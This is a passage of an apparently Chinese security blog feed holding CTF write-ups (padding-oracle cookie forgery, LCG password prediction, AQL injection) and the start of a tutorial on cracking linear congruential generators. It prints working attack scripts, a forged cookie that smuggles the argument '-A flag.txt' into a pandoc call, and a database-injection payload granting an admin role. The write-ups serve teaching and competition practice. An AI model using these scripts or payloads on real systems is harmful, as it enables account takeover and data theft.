class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># you need get padding_oracle from there</span></div><div class="line"><span class="comment"># https://github.com/pspaul/padding-oracle</span></div><div class="line"><span class="comment"># you need python3</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> padding_oracle <span class="keyword">import</span> PaddingOracle</div><div class="line"><span class="keyword">from</span> optimized_alphabets <span class="keyword">import</span> json_alphabet</div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">(cipher_hex)</span>:</span></div><div class="line">    headers = &#123;<span class="string">'Cookie'</span>: <span class="string">'vals=&#123;&#125;'</span>.format(cipher_hex)&#125;</div><div class="line">    r = requests.get(<span class="string">'http://converter.uni.hctf.fun/convert'</span>, headers=headers)</div><div class="line">    response = r.content</div><div class="line"></div><div class="line">    <span class="keyword">if</span> <span class="string">b'Invalid padding bytes.'</span> <span class="keyword">not</span> <span class="keyword">in</span> response:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"></div><div class="line"></div><div class="line">o = PaddingOracle(oracle, max_retries=<span class="number">-1</span>)</div><div class="line"></div><div class="line">cipher = <span class="string">'b5290bd594ba08fa58b1d5c7a19f876c338191a51eeeac94c2b434bdb8adbfb8596f996d6eddca93c059e3dc35f7bef36b57a5611250ec4528c11e1573799d2178c54c034b9ea8fda8ae9a4a41c67763'</span></div><div class="line">plain, _ = o.decrypt(cipher, optimized_alphabet=json_alphabet())</div><div class="line">print(<span class="string">'Plaintext: &#123;&#125;'</span>.format(plain))</div></pre></td></tr></table></figure><p>解密后cookie的内容为<code>{&quot;f&quot;: &quot;markdown&quot;, &quot;c&quot;: &quot;AAAABBBBCCCCDDDD&quot;, &quot;t&quot;: &quot;html4&quot;}</code>，一般这种文档转换使用的是<code>pandoc</code>，此处的<code>f</code>是控制输入格式，<code>c</code>是我们输入的内容，<code>t</code>是控制输出格式。</p><p>由题目可知我们要读取flag.txt中的内容，所以我们使用pandoc的<code>-A</code>参数，把flag.txt的内容包含出来。</p><blockquote><p>-A FILE, –include-after-body=FILE<br>Include contents of FILE, verbatim, at the end of the document body (before the  tag in HTML, or the \end{document} command in LaTeX). This option can be used repeatedly to include multiple files. They will be included in the order specified. Implies –standalone.</p></blockquote><p>要注意此处前端好像有白名单过滤，直接代入我们的参数话得不到我们想要的结果。</p><p><a href="https://i.loli.net/2018/11/01/5bdad0df8f22e.png" target="_blank" rel="external"><img src="https://i.loli.net/2018/11/01/5bdad0df8f22e.png" alt="屏幕快照 2018-11-01 下午6.06.45.png"></a></p><p>所以我在抓包之后修改cookie的值。cookie的生成脚本如下所示。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> padding_oracle <span class="keyword">import</span> PaddingOracle</div><div class="line"><span class="keyword">from</span> optimized_alphabets <span class="keyword">import</span> json_alphabet</div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">oracle</span><span class="params">(cipher_hex)</span>:</span></div><div class="line">    headers = &#123;<span class="string">'Cookie'</span>: <span class="string">'vals=&#123;&#125;'</span>.format(cipher_hex)&#125;</div><div class="line">    r = requests.get(<span class="string">'http://converter.uni.hctf.fun/convert'</span>, headers=headers)</div><div class="line">    response = r.content</div><div class="line"></div><div class="line">    <span class="keyword">if</span> <span class="string">b'Invalid padding bytes.'</span> <span class="keyword">not</span> <span class="keyword">in</span> response:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"></div><div class="line"></div><div class="line">o = PaddingOracle(oracle, max_retries=<span class="number">-1</span>)</div><div class="line"></div><div class="line">cipher = <span class="string">'b5290bd594ba08fa58b1d5c7a19f876c338191a51eeeac94c2b434bdb8adbfb8596f996d6eddca93c059e3dc35f7bef36b57a5611250ec4528c11e1573799d2178c54c034b9ea8fda8ae9a4a41c67763'</span></div><div class="line">plain     = <span class="string">b'&#123;"f": "markdown", "c": "AAAABBBBCCCCDDDD", "t": "html4"&#125;'</span></div><div class="line">plain_new = <span class="string">b'&#123;"f": "markdown -A flag.txt", "c": "D", "t": "html4"&#125;'</span></div><div class="line"></div><div class="line">cipher_new = o.craft(cipher, plain, plain_new)</div><div class="line">print(<span class="string">'Modified: &#123;&#125;'</span>.format(cipher_new))</div></pre></td></tr></table></figure><p>最终得到flag<br><a href="https://i.loli.net/2018/11/01/5bdad0dfc9b22.png" target="_blank" rel="external"><img src="https://i.loli.net/2018/11/01/5bdad0dfc9b22.png" alt="屏幕快照 2018-11-01 下午6.03.36.png"></a></p><h1 id="LCG-and-the-X"><a href="#LCG-and-the-X" class="headerlink" title="LCG and the X"></a>LCG and the X</h1><p>打开主页看到如下描述，最后一句<code>Save secret messages prefixed with &quot;flag{&quot; (which is always handy...)</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Hello!</div><div class="line">This is the website for our on-campus fanclub of the band LCG and the X!</div><div class="line">Everyone can signup for the club to:</div><div class="line"></div><div class="line">   Get the latest LCG news</div><div class="line">   Communicate with other fans</div><div class="line">   Save secret messages prefixed with &quot;flag&#123;&quot; (which is always handy...)</div></pre></td></tr></table></figure><p>接下我们进行注册登录，注册后可以看到如下信息：</p><p><a href="https://i.loli.net/2018/11/02/5bdc0a1864318.png" target="_blank" rel="external"><img src="https://i.loli.net/2018/11/02/5bdc0a1864318.png" alt="屏幕快照 2018-11-02 下午4.25.25.png"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">User Number: 34 </div><div class="line">Password: 4391179335210642486020975422279755323</div></pre></td></tr></table></figure><p>bitmap图片的地址为<code>http://lcgandthex.uni.hctf.fun/static/pics/34.bmp</code>，bitmap图片名称前面的序号和我们用户名的相同，所以如果我们更改图片前面的序号还可以下载其他的bitmap图片。而这个bitmap图片还是作为password recovery token来使用的，所以我们就可以利用它来重置别的账户的密码。</p><p>接下来我们进行登录，登陆后可以看到这样的信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">News</div><div class="line">Website Launch</div><div class="line">I just took the website online. I wrote it myself! </div><div class="line">I also just signed up to make sure the signup process works.</div><div class="line">Then I created a secret flag, which worked as well!</div><div class="line">Flag Storage Maintenance</div><div class="line">Because of the new data protection laws in europe I decided to temporarily disable the secret flag storage... I hope i can bring it back up soon...</div></pre></td></tr></table></figure><p>可以看到对于我们这个账户而言，密码是被隐藏的，因此可能我们需要登录管理员的账户进行查看？那么管理员有可能是序号为1的那一个？那么我们就要考虑怎么去获取1号的密码了。因为这里的password recovery token没有地方去让我们使用，比赛结束后也有看别的战队是使用如下脚本分析了bitmap图片然后得到一些信息之后进行LCG破解的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> math</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> imageio</div><div class="line"></div><div class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</div><div class="line">    print(<span class="string">"Usage: %s file.bmp"</span> % sys.argv[<span class="number">0</span>])</div><div class="line">    sys.exit(<span class="number">1</span>)</div><div class="line"></div><div class="line">filename = sys.argv[<span class="number">1</span>]</div><div class="line"></div><div class="line">image = imageio.imread(filename)</div><div class="line">out = <span class="number">0</span></div><div class="line"><span class="keyword">for</span> line <span class="keyword">in</span> image:</div><div class="line">    tmp = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(len(line)):</div><div class="line">        tmp &lt;&lt;= <span class="number">1</span></div><div class="line">        tmp |= <span class="number">1</span> <span class="keyword">if</span> line[x] == <span class="number">255</span> <span class="keyword">else</span> <span class="number">0</span></div><div class="line">    print(<span class="string">"% 40d"</span> % tmp)</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">对比两个用户bitmap图片中的信息可以发下现两者相差 313373133731337313373133731337</div><div class="line"></div><div class="line">这里只截取前五行</div><div class="line"></div><div class="line">34.bmp</div><div class="line">        10778143335877814333587781433348</div><div class="line">   8024293302815125776712035454147967229</div><div class="line">   8424888415969153255243735974754402615</div><div class="line">   3343897317520929957383430099400071436</div><div class="line">  12356584033995394658660863293223597252</div><div class="line">  </div><div class="line">35.bmp</div><div class="line">        11091516469609151646960915164685</div><div class="line">   9972138259316515878515303887207190382</div><div class="line">   7570417892854896822411051461517328212</div><div class="line">  16016475982551891670926030402121628733</div><div class="line">   9296242651229076123142121777120916609</div></pre></td></tr></table></figure><p>之后再推算出一下值之后进行的攻击</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">m = 16285270385112413720426683811263350667</div><div class="line">a = 313373133731337313373133731337</div><div class="line">c = 123456789012345678901234567890</div></pre></td></tr></table></figure><p>但是我们这里不这么干，密码是LCG生成的(因为题目本身就提示了LCG这个算法)，那么我们这里就属于不清楚a\c\m的值对LCG生成器进行攻击，那么连续注册几个账号，采集一下密码输入一下脚本就好了。着这里使用burp多重放几次数据包就可以了，不用次都去输信息注册。</p><p><a href="https://i.loli.net/2018/11/02/5bdc17da5c3fc.png" target="_blank" rel="external"><img src="https://i.loli.net/2018/11/02/5bdc17da5c3fc.png" alt="屏幕快照 2018-11-02 下午5.24.28.png"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">User Number: 34 </div><div class="line">Password: 4391179335210642486020975422279755323 </div><div class="line"></div><div class="line">User Number: 35 </div><div class="line">Password: 10752978387235368639990800431243402580 </div><div class="line"></div><div class="line">User Number: 36 </div><div class="line">Password: 829507054147681073533941628943699170 </div><div class="line"></div><div class="line">User Number: 37 </div><div class="line">Password: 7191306106172407227503766637907346427 </div><div class="line"></div><div class="line">User Number: 38 </div><div class="line">Password: 13553105158197133381473591646870993684</div></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> math</div><div class="line"><span class="keyword">import</span> functools</div><div class="line"></div><div class="line">reduce = functools.reduce</div><div class="line">gcd = math.gcd</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></div><div class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</div><div class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        g, x, y = egcd(b % a, a)</div><div class="line">        <span class="keyword">return</span> (g, y - (b // a) * x, x)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(b, n)</span>:</span></div><div class="line">    g, x, _ = egcd(b, n)</div><div class="line">    <span class="keyword">if</span> g == <span class="number">1</span>:</div><div class="line">        <span class="keyword">return</span> x % n</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_increment</span><span class="params">(states, modulus, multiplier)</span>:</span></div><div class="line">    increment = (states[<span class="number">1</span>] - states[<span class="number">0</span>]*multiplier) % modulus</div><div class="line">    <span class="keyword">return</span> modulus, multiplier, increment</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_multiplier</span><span class="params">(states, modulus)</span>:</span></div><div class="line">    print(<span class="string">'states'</span>, states)</div><div class="line">    multiplier = (states[<span class="number">2</span>] - states[<span class="number">1</span>]) * modinv(states[<span class="number">1</span>] - states[<span class="number">0</span>], modulus) % modulus</div><div class="line">    <span class="keyword">return</span> crack_unknown_increment(states, modulus, multiplier)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_modulus</span><span class="params">(states)</span>:</span></div><div class="line">    diffs = [s1 - s0 <span class="keyword">for</span> s0, s1 <span class="keyword">in</span> zip(states, states[<span class="number">1</span>:])]</div><div class="line">    zeroes = [t2*t0 - t1*t1 <span class="keyword">for</span> t0, t1, t2 <span class="keyword">in</span> zip(diffs, diffs[<span class="number">1</span>:], diffs[<span class="number">2</span>:])]</div><div class="line">    modulus = abs(reduce(gcd, zeroes))</div><div class="line">    <span class="keyword">return</span> crack_unknown_multiplier(states, modulus)</div><div class="line"></div><div class="line">print(crack_unknown_modulus([<span class="number">4391179335210642486020975422279755323</span>, </div><div class="line">    <span class="number">10752978387235368639990800431243402580</span>, <span class="number">829507054147681073533941628943699170</span>, <span class="number">7191306106172407227503766637907346427</span>, <span class="number">13553105158197133381473591646870993684</span>]))</div><div class="line"> </div><div class="line"><span class="comment"># m = 1  # the "multiplier"</span></div><div class="line"><span class="comment"># c = 6361799052024726153969825008963647257  # the "increment"</span></div><div class="line"><span class="comment"># n = 16285270385112413720426683811263350667  # the "modulus"</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">prng_lcg</span>:</span></div><div class="line">    m = <span class="number">1</span>  <span class="comment"># the "multiplier"</span></div><div class="line">    c = <span class="number">6361799052024726153969825008963647257</span>  <span class="comment"># the "increment"</span></div><div class="line">    n = <span class="number">16285270385112413720426683811263350667</span>  <span class="comment"># the "modulus"</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, seed)</span>:</span></div><div class="line">        self.state = seed  <span class="comment"># the "seed"</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span><span class="params">(self)</span>:</span></div><div class="line">        self.state = (self.state * self.m + self.c) % self.n</div><div class="line">        <span class="keyword">return</span> self.state</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">prev</span><span class="params">(self)</span>:</span></div><div class="line">        self.state = (self.state - self.c) % self.n</div><div class="line">        <span class="keyword">return</span> int(self.state)</div><div class="line"></div><div class="line"><span class="comment">#User Number: 46 </span></div><div class="line"><span class="comment">#Password: 15591686419057701451952140284790119739 </span></div><div class="line"></div><div class="line">gen = prng_lcg(<span class="number">15591686419057701451952140284790119739</span>) </div><div class="line"></div><div class="line">num = <span class="number">45</span></div><div class="line"><span class="keyword">while</span> num &gt; <span class="number">0</span>:</div><div class="line">    p = gen.prev()</div><div class="line">    print(num, p)</div><div class="line">    <span class="keyword">if</span> p == <span class="number">4391179335210642486020975422279755323</span>:</div><div class="line">        print(<span class="string">'sanity check: working'</span>)</div><div class="line">    num -= <span class="number">1</span></div><div class="line"></div><div class="line"><span class="comment"># 1 =&gt; 6160325624856057770563639672902954513</span></div></pre></td></tr></table></figure><p>最后登录得到flag<br><a href="https://i.loli.net/2018/11/02/5bdc17d94dd01.png" target="_blank" rel="external"><img src="https://i.loli.net/2018/11/02/5bdc17d94dd01.png" alt="屏幕快照 2018-11-02 下午5.23.43.png"></a></p><p>PS:关于此处LCG攻击，你可以查看<a href="http://zeroyu.xyz/2018/11/02/Cracking-LCG/" target="_blank" rel="external">《攻击线性同余生成器(LCG)》</a></p><h1 id="H-pster-Startup"><a href="#H-pster-Startup" class="headerlink" title="H!pster Startup"></a>H!pster Startup</h1><p>主页代码里可以找到后台，所以就不用扫描了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;!--  Main navigation  --&gt;</div><div class="line">&lt;ul class=&quot;main-nav nav navbar-nav navbar-right&quot;&gt;</div><div class="line">&lt;li&gt;&lt;a href=&quot;#home&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;</div><div class="line">&lt;li&gt;&lt;a href=&quot;#service&quot;&gt;Services&lt;/a&gt;&lt;/li&gt;</div><div class="line">    &lt;!-- &lt;li&gt;&lt;a href=&quot;/admin&quot;&gt;Admin-Panel&lt;/a&gt;&lt;/li&gt; --&gt;</div><div class="line">&lt;/ul&gt;</div><div class="line">&lt;!-- /Main navigation --&gt;</div></pre></td></tr></table></figure><p>后台测试发现是ArangoDB并且使用pyArango进行驱动程序。源码中存在如下内容，所以需要<code>_id</code>参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">try :</div><div class="line">    collection = self.database[docJson[&quot;_id&quot;].split(&quot;/&quot;)[0]]</div><div class="line">except KeyError :</div><div class="line">    raise CreationError(&quot;result %d is not a valid Document. Try setting rawResults to True&quot; % i)</div></pre></td></tr></table></figure><p>最终的payload为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">user: &apos; || 1 RETURN &#123;_id: u._id, role:&apos;admin&apos;&#125; //</div></pre></td></tr></table></figure></p><p>flag为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;1_l0v3_a_g00d_1nj3ct10n&#125;</div></pre></td></tr></table></figure><p>此处我在写note的时候，官方的题目已经关闭了，所以列出一些参考:</p><p><a href="https://www.pwndiary.com/write-ups/p-w-n-ctf-2018-hpster-startup-write-up-web216/" target="_blank" rel="external">[P.W.N. CTF 2018] H!pster Startup Write-up (Web216)</a></p><p><a href="https://0day.work/p-w-n-university-web-200-h-pster-startup-writeup/" target="_blank" rel="external">P.W.N University: web 200 - H!pster Startup writeup</a></p><p><a href="https://xz.aliyun.com/t/3096#toc-5" target="_blank" rel="external">《P.W.N. CTF web题解》</a></p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>攻击线性同余生成器(LCG)</title>
      <link href="/2018/11/02/Cracking-LCG/"/>
      <url>/2018/11/02/Cracking-LCG/</url>
      <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>目前我们在编程中经常会使用随机数，但是其中会不会存在什么问题呢？要知道CPU计算中的各种状态都是确定的，在其中的随机数不是凭空产生的，所以这种随机数真的随机吗？目前生成随机数的方式主要分为以下几种:</p><ul><li>硬件随机数生成器</li><li>利用现有硬件，从非预期方式产生随机数(比如利用音频的产生、硬盘寻址时间等)</li><li>伪随机数</li><li>量子技术</li></ul><p>PS: RDRAND指令产生的随机数目前存在争议，在此不做详细讨论。有兴趣可以参考 <a href="https://zh.wikipedia.org/wiki/RdRand" target="_blank" rel="external">RdRand</a></p><p>虽然选择很多，但是目前还是主要采用伪随机数的方式来应对实际开发中需要的场景。用于产生这些看起来随机但实际是由确定性算法生成数字的机制被称为”伪随机数发生器”，简称为PRNG。</p><p>PRNG的中心是确定的，如果攻击者知道其内部的完整状态，则可以对未来的值和过去的值进行预测。如果PRNG被用于加密密钥、生成证书等场景，就会出现安全问题。</p><p>接下来我将详细讲解对线性同余发生器的攻击。</p><h2 id="0x01-线性同余生成器-LCG"><a href="#0x01-线性同余生成器-LCG" class="headerlink" title="0x01 线性同余生成器(LCG)"></a>0x01 线性同余生成器(LCG)</h2><h3 id="1-线性同余方法"><a href="#1-线性同余方法" class="headerlink" title="1.线性同余方法"></a>1.线性同余方法</h3><p>线性同余方法（LCG）是个产生伪随机数的方法。</p><p>它是根据递归公式：</p><p><html><br><img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/0977413db70881e55ed0f0dd154d7314f0f4499a" class="mwe-math-fallback-image-inline" aria-hidden="true" style="vertical-align: -1.005ex; width:33.874ex; height:3.009ex;" alt="N_NaN\equiv (A\times N_{j}+B){\pmod  {M}}"><br></html><br>其中A,B,M是产生器设定的常数。</p><p>LCG的周期最大为 M，但大部分情况都会少于M。要令LCG达到最大周期，应符合以下条件：</p><ol><li>B,M互质；</li><li>M的所有质因数都能整除A-1；</li><li>若M是4的倍数，A-1也是；</li><li>A,B,N[0]都比M小；</li><li>A,B是正整数。</li></ol><h3 id="2-Python代码实现"><a href="#2-Python代码实现" class="headerlink" title="2.Python代码实现"></a>2.Python代码实现</h3><p>由上面的原理我们可以看到，其中最重要的是定义了三个整数，乘数A、增量B和模数M，因此我们在此用简单的几行Python代码实现一下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">class prng_lcg:</div><div class="line">    m = 672257317069504227  # &quot;乘数&quot;</div><div class="line">    c = 7382843889490547368  # &quot;增量&quot;</div><div class="line">    n = 9223372036854775783  # &quot;模数&quot;</div><div class="line"></div><div class="line">    def __init__(self, seed):</div><div class="line">        self.state = seed  # the &quot;seed&quot;</div><div class="line"></div><div class="line">    def next(self):</div><div class="line">        self.state = (self.state * self.m + self.c) % self.n</div><div class="line">        return self.state</div><div class="line"></div><div class="line"></div><div class="line">def test():</div><div class="line">    gen = prng_lcg(123)  # seed = 123</div><div class="line">    print gen.next()  # 第一个生成值</div><div class="line">    print gen.next()  # 第二个生成值</div><div class="line">    print gen.next()  # 第三个生成值</div></pre></td></tr></table></figure><h3 id="3-LCG的优缺点"><a href="#3-LCG的优缺点" class="headerlink" title="3.LCG的优缺点"></a>3.LCG的优缺点</h3><p>LCG目前是分流行，得益于其在数学表达实现上十分优雅、非常容易理解并且容易设计实现、计算速度可以非常快。但是它也存在一些缺点，比如它在加密安全性方面十分弱。接下来将从以下几种情况对其进行攻击。</p><h2 id="0x02-攻击LCG"><a href="#0x02-攻击LCG" class="headerlink" title="0x02 攻击LCG"></a>0x02 攻击LCG</h2><h3 id="1-对于A、B、M以及N0已知的情况"><a href="#1-对于A、B、M以及N0已知的情况" class="headerlink" title="1. 对于A、B、M以及N0已知的情况"></a>1. 对于A、B、M以及N0已知的情况</h3><p>假设我们观察到有一个LCG系统产生了以下三组连续的值，并且我们知道内部的参数如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># 三组连续的值</div><div class="line">s0 = 2300417199649672133</div><div class="line">s1 = 2071270403368304644</div><div class="line">s2 = 5907618127072939765</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># 内部的参数</div><div class="line">m = 672257317069504227   # the &quot;multiplier&quot;</div><div class="line">c = 7382843889490547368  # the &quot;increment&quot;</div><div class="line">n = 9223372036854775783  # the &quot;modulus&quot;</div></pre></td></tr></table></figure><p>在已知了这些参数之后我们可以很快的推算出未来的数值或者之前的某个数值，所以还是存在安全问题的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">In [1]: m = 672257317069504227</div><div class="line"></div><div class="line">In [2]: c = 7382843889490547368</div><div class="line"></div><div class="line">In [3]: n = 9223372036854775783</div><div class="line"></div><div class="line">In [4]: s0 = 2300417199649672133</div><div class="line"></div><div class="line">In [5]: s1 = (s0*m + c) % n</div><div class="line"></div><div class="line">In [6]: s2 = (s1*m + c) % n</div><div class="line"></div><div class="line">In [7]: s3 = (s2*m + c) % n</div><div class="line"></div><div class="line">In [8]: s4 = (s3*m + c) % n</div><div class="line"></div><div class="line">In [9]: s1</div><div class="line">Out[9]: 2071270403368304644L</div><div class="line"></div><div class="line">In [10]: s2</div><div class="line">Out[10]: 5907618127072939765L</div><div class="line"></div><div class="line">In [11]: s3</div><div class="line">Out[11]: 5457707446309988294L</div></pre></td></tr></table></figure><h3 id="2-增量未知"><a href="#2-增量未知" class="headerlink" title="2.增量未知"></a>2.增量未知</h3><p>我们不清楚增量，但是我们知道以下信息:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">m = 81853448938945944</div><div class="line">c = # unknown</div><div class="line">n = 9223372036854775783</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># 初值和第一个计算值</div><div class="line">s0 = 4501678582054734753</div><div class="line">s1 = 4371244338968431602</div></pre></td></tr></table></figure><p>我们稍稍改写下公式就可以将目标c计算出来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">s1 = s0*m + c   (mod n)</div><div class="line"></div><div class="line">c  = s1 - s0*m  (mod n)</div></pre></td></tr></table></figure><p>此种类型Python攻击代码如下所示:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">def crack_unknown_increment(states, modulus, multiplier):</div><div class="line">    increment = (states[1] - states[0]*multiplier) % modulus</div><div class="line">    return modulus, multiplier, increment</div><div class="line"></div><div class="line">print crack_unknown_increment([4501678582054734753, 4371244338968431602], 9223372036854775783, 81853448938945944)</div></pre></td></tr></table></figure><h3 id="3-增量和乘数都未知"><a href="#3-增量和乘数都未知" class="headerlink" title="3.增量和乘数都未知"></a>3.增量和乘数都未知</h3><p>我们虽然不知道增量和乘数但是我们知道以下数值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">m = # unknown</div><div class="line">c = # unknown</div><div class="line">n = 9223372036854775783</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># 